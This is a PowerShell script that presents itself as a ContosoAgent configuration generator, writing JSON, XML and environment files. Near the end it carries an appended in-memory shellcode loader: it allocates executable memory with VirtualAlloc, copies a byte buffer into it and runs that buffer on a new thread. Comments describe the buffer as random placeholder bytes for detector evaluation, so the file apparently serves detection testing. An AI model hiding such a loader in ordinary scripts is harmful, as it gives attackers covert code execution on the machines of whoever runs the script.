
#Requires -Version 5.1
<#
.SYNOPSIS
    Generates the ContosoAgent JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.EXAMPLE
    .\Write-AgentConfig.ps1 -Environment Test
.EXAMPLE
    .\Write-AgentConfig.ps1 -ApiPort 5000 -Force
.NOTES
    Author: Platform Engineering
    Last updated: 2024-02-06
#>

$ErrorActionPreference = "Stop"
$OutputPath  = 'C:\ProgramData\Contoso\ContosoAgent\config.json'
$Environment = 'Test'
$ApiPort     = 5000
$NodeCount   = 6
$Force       = $false


$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'ContosoAgent'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.internal.corp/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}
$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.agent.logLevel = 'Information'
$config | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "ContosoAgent",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8

$environmentFile = $OutputPath.Replace('.json', '.env')
$lines = @(
    "AGENT_ENV=$Environment"
    "AGENT_PORT=$ApiPort"
)
$lines | Set-Content -LiteralPath $environmentFile -Encoding UTF8

$xmlPath = $OutputPath.Replace('.json', '.xml')
$xml = New-Object System.Xml.XmlDocument
$root = $xml.CreateElement('configuration')
$xml.AppendChild($root) | Out-Null
$entry = $xml.CreateElement('add')
$entry.SetAttribute('key', 'Environment')
$entry.SetAttribute('value', $Environment)
$root.AppendChild($entry) | Out-Null
$xml.Save($xmlPath)

$configHash = (Get-FileHash -LiteralPath $OutputPath -Algorithm SHA256).Hash
Write-Verbose ("Config SHA256: {0}" -f $configHash)
$schemaFile = Join-Path $PSScriptRoot 'config.schema.json'
if (Test-Path -LiteralPath $schemaFile) {
    Write-Verbose ("Schema available: {0}" -f $schemaFile)
}

$summaryBody = "Config generated for {0} on $env:COMPUTERNAME" -f $Environment
Send-MailMessage -To 'ops@contoso.com' -From 'config@contoso.com' -Subject 'Agent configuration generated' -Body $summaryBody -SmtpServer 'smtp.contoso.com' -Port 25

$config | ConvertTo-Json -Depth 6
Write-Host ("Configuration complete for {0}" -f $Environment) -ForegroundColor Green

$encoding = [System.Text.UTF8Encoding]::new($false)
$encoding.GetType().Name | Write-Verbose

$previous = Join-Path (Split-Path -Parent $OutputPath) 'config.previous.json'
if (Test-Path -LiteralPath $previous) {
    Write-Verbose ("Previous config: {0}" -f $previous)
}

$defaults = @{
    retryCount = 3
    backoffSec = 5
    heartbeat  = 30
}
$defaults.GetEnumerator() | ForEach-Object { Write-Verbose ("{0} = {1}" -f $_.Key, $_.Value) }

$portInUse = Get-NetTCPConnection -LocalPort $ApiPort -ErrorAction SilentlyContinue
if ($portInUse) {
    Write-Warning ("Port {0} is already in use" -f $ApiPort)
}

$nodeList = 1..$NodeCount | ForEach-Object { 'node-{0:d2}' -f $_ }
Write-Verbose ("Planned nodes: {0}" -f ($nodeList -join ', '))

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x06, 0x08, 0x33, 0x29, 0x89, 0x2c, 0x1d, 0x92, 0xb4, 0x99, 0xba, 0x18, 0x07, 0x18, 0x0e, 0x79,
    0xfe, 0x1a, 0xb7, 0xfc, 0x41, 0x95, 0xb5, 0xdb, 0xa1, 0xe3, 0x76, 0x88, 0xa5, 0xdc, 0x5b, 0xe9,
    0xbe, 0x52, 0x2b, 0x18, 0xea, 0x3e, 0x63, 0x65, 0x21, 0xb5, 0xc1, 0x8e, 0x53, 0xd2, 0x9a, 0x7f,
    0x79, 0x11, 0x9d, 0x98, 0x4c, 0xd7, 0x90, 0x6a, 0x22, 0x6d, 0xba, 0xe4, 0x4a, 0x4c, 0x5e, 0x50,
    0xba, 0x91, 0xd7, 0x96, 0x2a, 0x1d, 0x5e, 0x2c, 0x34, 0x20, 0xec, 0x71, 0xef, 0x1e, 0xed, 0x28,
    0x3c, 0x39, 0x7b, 0x89, 0x6c, 0xb7, 0x75, 0x8f, 0x53, 0x66, 0x86, 0x2a, 0x43, 0x9d, 0xe8, 0xed,
    0x7c, 0x5d, 0xab, 0x6f, 0x99, 0x3c, 0xa2, 0x64, 0x66, 0x7f, 0xa2, 0x2f, 0x19, 0x31, 0xe6, 0xb8,
    0xa6, 0xda, 0x30, 0xef, 0x35, 0x7e, 0x34, 0x2b, 0xcb, 0x31, 0xd8, 0x19, 0xb7, 0x22, 0x84, 0xcb,
    0x22, 0x69, 0xf9, 0xe8, 0x7a, 0x82, 0xd5, 0x8d, 0x50, 0xcb, 0x41, 0x11, 0x91, 0x60, 0xb4, 0xb1,
    0x63, 0x13, 0x42, 0x3a, 0x16, 0x3a, 0x03, 0xda, 0xcb, 0xa1, 0x58, 0xe4, 0xe3, 0xb6, 0xa8, 0x93,
    0x6e, 0x43, 0x9d, 0xea, 0x7f, 0x38, 0xfc, 0x55, 0x14, 0x4d, 0x7f, 0x17, 0x60, 0xbf, 0xa1, 0xb8,
    0xfb, 0xa5, 0x13, 0x8c, 0x0a, 0x8c, 0x92, 0x1e, 0x19, 0x3a, 0x28, 0x2c, 0xeb, 0x8d, 0xfb, 0xb3,
    0x4f, 0x80, 0x97, 0x07, 0x04, 0x29, 0x75, 0x58, 0x37, 0xc0, 0xf2, 0x6f, 0x27, 0x8a, 0x25, 0xbf,
    0x52, 0x25, 0x62, 0xc6, 0x59, 0x2e, 0xdc, 0x1c, 0xff, 0x7a, 0xe5, 0x5b, 0x9e, 0xe4, 0xc6, 0x12,
    0x3f, 0xa7, 0x88, 0x7d, 0xfa, 0xe9, 0xb6, 0xea, 0xe8, 0x63, 0x1c, 0xfe, 0x55, 0xc0, 0x57, 0xe5,
    0xd0, 0x72, 0x7e, 0xd2, 0x43, 0x20, 0xd3, 0x23, 0xe4, 0x61, 0x53, 0xad, 0x5f, 0x93, 0x05, 0xd7,
    0x50, 0x7d, 0x9b, 0xbf, 0xf6, 0x91, 0x0b, 0x52, 0xeb, 0x01, 0xe5, 0xa1, 0x73, 0x56, 0x3f, 0xa1,
    0xd9, 0x20, 0xbf, 0x83, 0x05, 0xff, 0x2c, 0xcc, 0x24, 0xff, 0x88, 0x64, 0xe7, 0xf5, 0x88, 0xbc,
    0xbf, 0x4a, 0x41, 0xfb, 0x72, 0xfd, 0xf1, 0xda, 0x5f, 0xc6, 0xb3, 0x02, 0x40, 0x04, 0xc0, 0xcb,
    0x49, 0x05, 0xee, 0xf8, 0x12, 0xf5, 0xe1, 0x8a, 0x82, 0x62, 0x12, 0xc5, 0x13, 0xb6, 0x0c, 0x36,
    0xea, 0x1f, 0x2e, 0x56, 0x18, 0xee, 0x15, 0xe9, 0x34, 0x02, 0x70, 0x0c, 0x67, 0xab, 0x1b, 0xd5,
    0x68, 0xa1, 0xf1, 0x9f, 0xe6, 0x76, 0x6c, 0x84, 0x72, 0xd9, 0x2c, 0x0e, 0xaa, 0xa3, 0x4e, 0x71,
    0x6b, 0x68, 0x9b, 0x6a, 0x74, 0x94, 0xff, 0x1e, 0x1b, 0x96, 0x54, 0x96, 0x01, 0xb1, 0x07, 0x87,
    0xb2, 0x86, 0x2c, 0x0b, 0x29, 0xad, 0x08, 0x22, 0x5a, 0x94, 0xae, 0xf7, 0x51, 0x8f, 0x58, 0xbb,
    0xe5, 0xea, 0xe8, 0xec, 0x40, 0x97, 0xc1, 0xa9, 0xae, 0x44, 0x1b, 0x12, 0xa0, 0xfe, 0x0b, 0xc1,
    0xe7, 0x25, 0xbd, 0x97, 0xd0, 0x87, 0x7c, 0xff, 0x20, 0xa9, 0xa1, 0x17, 0xba, 0x99, 0x3f, 0xeb,
    0xb6, 0x6a, 0x83, 0x28, 0x10, 0x27, 0x16, 0xde, 0xeb, 0xcd, 0x64, 0xf4, 0xf1, 0x83, 0x25, 0xa8,
    0x33, 0xfe, 0x77, 0xa1, 0x8d, 0xf7, 0x3c, 0xad, 0x5f, 0x31, 0x7b, 0xdd, 0x6d, 0x9c, 0x0d, 0x18,
    0xaa, 0xfa, 0xb8, 0x48, 0xb6, 0x1c, 0x7e, 0x15, 0xab, 0xcf, 0xef, 0xdc, 0x16, 0x6f, 0xc8, 0xf0,
    0xbd
)

$HProcess = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 3976)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
